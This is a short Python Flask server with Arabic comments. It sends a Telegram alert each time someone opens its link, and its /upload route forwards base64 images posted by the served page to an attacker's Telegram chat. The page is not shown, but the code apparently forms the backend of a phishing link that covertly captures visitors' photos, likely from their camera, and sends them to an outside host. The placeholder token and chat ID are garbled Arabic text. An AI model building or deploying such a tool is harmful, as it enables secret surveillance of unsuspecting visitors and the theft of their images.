from flask import Flask, render_template, request
import requests
import base64
app = Flask(__name__)

TOKEN = 'جف_حشا_تمنش_البمت'
ID = 'جف_حشا_الأيدي_الخاص_بن'

@app.route('/')
def index():
    # رطالآ اختبار تصلن بمجرد فتح أي شخص للرابط
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=تم_فتح_الرابط_الآن')
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        img_data = request.json['img'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        res = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', img_bytes)})
        return res.text
    except Exception as e: return str(e)
